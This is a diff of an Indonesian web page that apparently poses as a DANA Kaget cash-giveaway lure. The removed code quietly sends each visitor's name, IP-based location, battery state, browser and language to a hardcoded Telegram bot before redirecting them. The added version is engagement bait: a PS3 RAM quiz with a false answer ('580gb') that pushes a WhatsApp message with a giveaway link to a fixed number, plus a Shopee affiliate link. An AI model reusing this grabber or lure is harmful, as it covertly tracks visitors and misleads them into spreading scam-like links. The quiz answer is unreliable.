@@ -3,204 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kirim Info ke Telegram</title>
+    <title>Soal Sederhana</title>
     <style>
         body {
             font-family: sans-serif;
-            background-color: #f4f4f4;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
             min-height: 100vh;
             margin: 0;
-            flex-direction: column;
+            background-color: #f4f4f4;
         }
+
         .container {
             background-color: #fff;
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
-            margin-bottom: 20px;
         }
+
         h2 {
             color: #333;
             margin-bottom: 20px;
         }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #555;
-            font-weight: bold;
-        }
-        input[type="text"] {
-            width: calc(100% - 20px);
-            padding: 10px;
+
+        img {
+            max-width: 200px;
+            height: auto;
             margin-bottom: 20px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 16px;
         }
+
+        p {
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            width: 250px;
+        }
+
         button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+
+        .jawab-button {
             background-color: #007bff;
             color: white;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 18px;
-            transition: background-color 0.3s ease;
         }
-        button:hover {
+
+        .lihat-jawaban-button {
+            background-color: #28a745;
+            color: white;
+        }
+
+        .jawab-button:hover {
             background-color: #0056b3;
         }
-        #status {
+
+        .lihat-jawaban-button:hover {
+            background-color: #1e7e34;
+        }
+
+        #hasil {
             margin-top: 20px;
             font-weight: bold;
-            color: #28a745;
-        }
-        #status.error {
-            color: #dc3545;
-        }
-        #video-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        video {
-            max-width: 80%;
-            max-height: 80%;
-            margin-bottom: 10px;
-        }
-        #loading-text {
-            color: white;
-            font-size: 1.2em;
-            font-style: italic;
-            margin-bottom: 5px;
-        }
-        #countdown {
-            color: white;
-            font-size: 1.5em;
-            font-weight: bold;
-        }
-        .hidden {
-            display: none !important;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>DAGET 2p 50s</h2>
-        <label for="nama">Nama:</label>
-        <input type="text" id="nama" name="nama" placeholder="Masukkan nama Anda">
-        <button onclick="kirimDanTampilkanVideo()">KIRIM</button>
-        <div id="status"></div>
-    </div>
-
-    <div id="video-container" class="hidden">
-        <video id="myVideo" src="https://h.top4top.io/m_3387h96vt0.mp4"></video>
-        <p id="loading-text">Tunggu sebentar.. iklan dulu hehehe</p>
-        <p id="countdown"></p>
+        <h2>Tebak Ram Ps3 Di Bawah ini !!</h2>
+        <img src="https://j.top4top.io/p_3388o7ggx0.jpg">
+        <p>Pertanyaan soalnya,total ram PS3 ini RAM berapa?</p>
+        <input type="text" id="jawabanPengguna" placeholder="Contoh: 30gb (huruf kecil semua)">
+        <button class="jawab-button" onclick="periksaJawaban()">Jawab</button>
+        <button class="lihat-jawaban-button" onclick="window.location.href='https://s.shopee.co.id/9pQttM6JZo'">Lihat Jawaban di shoppe</button>
+        <div id="hasil"></div>
     </div>
 
     <script>
-        const videoContainer = document.getElementById('video-container');
-        const myVideo = document.getElementById('myVideo');
-        const statusDiv = document.getElementById("status");
-        const countdownDisplay = document.getElementById('countdown');
-        let countdownTime = 19;
-        let countdownInterval;
+        function periksaJawaban() {
+            const jawabanPengguna = document.getElementById("jawabanPengguna").value.trim().toLowerCase();
+            const jawabanBenar = "580gb"; // Jawaban yang dianggap benar
+            const nomorWhatsApp = "6285711374861";
+            let pesanWhatsApp = "";
 
-        async function getBatteryInfo() {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                const status = battery.charging ? "🔌 Mengisi daya" : "⚡ Tidak mengisi daya";
-                return `Baterai: ${Math.round(battery.level * 100)}% (${status})`;
+            if (jawabanPengguna === jawabanBenar) {
+                pesanWhatsApp = encodeURIComponent(`Saya menjawab benar pertanyaan tentang RAM PS3! Jawaban saya adalah: ${jawabanPengguna} Aku lagi sebar DANA Kaget nih! Yuk, sikat segera sebelum melayang 💸💸💸 https://link.dana.id/danakaget?c=swrcxjlln&r=cAYM8h&orderId=20250411101214282315010300166998217191404`);
+                window.location.href = `https://wa.me/${nomorWhatsApp}?text=${pesanWhatsApp}`;
+            } else {
+                document.getElementById("hasil").innerText = "Jawaban Anda salah. Coba lagi!";
+                pesanWhatsApp = encodeURIComponent(`Saya menjawab salah pertanyaan tentang RAM PS3. Jawaban saya adalah: ${jawabanPengguna}`);
+                // Anda bisa menambahkan logika di sini jika ingin tetap mengirim pesan WA meskipun jawaban salah
+                // window.location.href = `https://wa.me/${nomorWhatsApp}?text=${pesanWhatsApp}`;
             }
-            return "Baterai: Tidak didukung";
-        }
-
-        async function kirimKeTelegram(nama) {
-            statusDiv.innerHTML = "...";
-            statusDiv.className = "";
-
-            try {
-                const apiUrl = "https://api.db-ip.com/v2/free/self";
-                const response = await fetch(apiUrl);
-                const data = await response.json();
-                const batteryInfo = await getBatteryInfo();
-                const userAgent = navigator.userAgent;
-                const browser = navigator.vendor || "Tidak diketahui";
-                const bahasa = navigator.language;
-                const pesan = `
-🌍 **Informasi Pengguna**
-- **Nama:** ${nama}
-- **IP:** ${data.ipAddress}
-- **Negara:** ${data.countryName}
-- **Provinsi:** ${data.stateProv}
-- **Kota:** ${data.city}
-- **${batteryInfo}**
-- **User Agent:** ${userAgent}
-- **Browser:** ${browser}
-- **Bahasa:** ${bahasa}
-                `;
-                const botToken = "7863353249:AAGeLK7vgDRaqXrdL6dLLSmogSyySPjda7k"; // API Key Telegram
-                const chatId = "-4634384561"; // Chat ID Telegram
-                const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const telegramResponse = await fetch(telegramApi, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ chat_id: chatId, text: pesan, parse_mode: "Markdown" })
-                });
-
-                if (telegramResponse.ok) {
-                    statusDiv.innerHTML = "...";
-                    tampilkanVideo();
-                } else {
-                    statusDiv.innerHTML = "Gagal mengirim informasi.";
-                    statusDiv.className = "error";
-                }
-            } catch (error) {
-                console.error("Error:", error);
-                statusDiv.innerHTML = "Terjadi kesalahan!";
-                statusDiv.className = "error";
-            }
-        }
-
-        function tampilkanVideo() {
-            videoContainer.classList.remove('hidden');
-            myVideo.play();
-            countdownTime = 19;
-            countdownDisplay.textContent = countdownTime;
-
-            countdownInterval = setInterval(() => {
-                countdownTime--;
-                countdownDisplay.textContent = countdownTime;
-                if (countdownTime <= 0) {
-                    clearInterval(countdownInterval);
-                    videoContainer.classList.add('hidden');
-                    window.location.href = "https://link.dana.id/danakaget?c=s27m3mfc7&r=cAYM8h&orderId=20250411101214120715010300166998217278273";
-                }
-            }, 1000);
-        }
-
-        function kirimDanTampilkanVideo() {
-            const nama = document.getElementById("nama").value;
-            if (!nama.trim()) {
-                statusDiv.innerHTML = "Nama tidak boleh kosong.";
-                statusDiv.className = "error";
-                return;
-            }
-            kirimKeTelegram(nama);
         }
     </script>
 </body>
